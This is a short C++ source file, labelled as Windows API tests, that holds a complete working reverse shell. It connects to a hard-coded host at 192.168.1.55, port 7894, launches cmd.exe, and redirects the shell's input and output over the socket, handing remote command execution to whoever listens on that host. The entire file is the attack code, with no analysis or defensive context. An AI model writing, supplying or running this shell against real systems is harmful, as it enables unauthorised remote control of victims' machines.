/* *
 * Windows API Tests - Reverse Shell
 * */

#include <ws2tcpip.h>
#include <Windows.h>
#include <iostream>
#pragma comment(lib, "ws2_32.lib") // link ws2_32.dll

#define MY_BUFLEN 1024


int main(int argc, char **argv)
{

    SOCKET mySocket;
    sockaddr_in addr;
    WSADATA version;
    WSAStartup(MAKEWORD(2, 2), &version);
    mySocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, (unsigned int)NULL, (unsigned int)NULL);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.1.55");
    addr.sin_port = htons(7894);

    if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), nullptr, nullptr, nullptr, nullptr) == SOCKET_ERROR)
    {
        closesocket(mySocket);
        WSACleanup();
    }
    else
    {
        puts("Client connected!");
        char Process[] = "cmd.exe";
        STARTUPINFO sinfo;
        PROCESS_INFORMATION pinfo;
        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
        CreateProcess(nullptr, Process, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &sinfo, &pinfo);
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
        closesocket(mySocket);
        WSACleanup();
        puts("Shell closed");
    }
    return 0;
}